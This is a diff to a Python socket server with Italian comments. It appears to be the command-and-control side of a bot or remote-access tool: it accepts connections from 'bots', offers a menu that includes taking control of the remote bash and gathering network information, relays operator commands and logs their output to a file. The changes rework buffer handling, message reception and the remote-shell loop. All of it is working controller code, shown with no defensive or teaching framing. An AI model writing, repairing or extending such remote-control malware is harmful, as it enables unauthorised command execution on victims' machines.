@@ -1,7 +1,7 @@
 from socket import *
 serverPort = 12003
  #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
-BUFFER_SIZE = 1024 * 128
+BUFFER_SIZE = 1024 * 16
 serverSocket = socket(AF_INET,SOCK_STREAM)
 serverName = gethostbyname(gethostname())
 serverSocket.bind(('',serverPort))
@@ -15,7 +15,6 @@ def invia_messaggio(messaggio):
         return True
     except Exception as e:
         #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
-        print (str(e.errno))
         print(str(e))
         connectionSocket.close()
         connectionSocket, addr = serverSocket.accept()
@@ -35,11 +34,13 @@ def ricevi_stampa_messaggio():
 def ricevi_messaggio():
     global connectionSocket
     try:
-        messaggio = connectionSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
+        messaggio = ""
+        numripetizioni = connectionSocket.recv(1).decode('utf-8', 'ignore')
+        for x in range(0, int(numripetizioni)):
+            messaggio = messaggio + connectionSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
         return str(messaggio)
     except Exception as e:
         #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
-        print (str(e.errno))
         print(str(e))
         connectionSocket.close()
         connectionSocket, addr = serverSocket.accept()
@@ -58,8 +59,7 @@ def menu():
           +"6: ricevi informazioni sulla rete\n"
           +"7: entra in controllo della bash\n"
           +"8: pulisci il file di log\n"
-          +"9: riepilogo informazioni\n"
-          +"10: attendi buffer\n");
+          +"9: riepilogo informazioni\n");
     return input()
     
 while True:
@@ -75,28 +75,27 @@ while True:
             while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                 cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                 if cmd.lower() != "exit":
-                    if (not(invia_messaggio(f"7<sep>{cmd}"))): break
+                    if (not(invia_messaggio(f"7<sep>{cmd}"))):
+                        break
                     output = ricevi_messaggio()
                     risultato = output.split('<sep>')
-                    if (len(risultato)==2):
-                        queryRes, cwd = output.split('<sep>')
-                        f = open("Info.txt", "a")
-                        f.write("Comando inviato: " + cmd)
-                        f.write("\nRisultato:\n")
-                        f.write (queryRes)
-                        f.write("\n\n\n")
-                        f.close()
-                    else: queryRes = "Errore"
+                    if (len(risultato)==1):
+                        output = output + '<sep>' + ""
+                    queryRes, cwd = output.split('<sep>')
+                    f = open("Info.txt", "a")
+                    f.write("Comando inviato: " + cmd)
+                    f.write("\nRisultato:\n")
+                    f.write (queryRes)
+                    f.write("\n\n\n")
+                    f.close()
                     print(queryRes + "\n")
         elif comando == '8':
             f = open("Info.txt", "a")
             f.truncate(0)
-        elif comando == '10':
-            ricevi_stampa_messaggio()
         else:
-            invia_messaggio(comando)
+            msginviato = invia_messaggio(comando)
             if (comando != "0"):
-                ricevi_stampa_messaggio()
+                if msginviato: ricevi_stampa_messaggio()
             else:
                 break
 
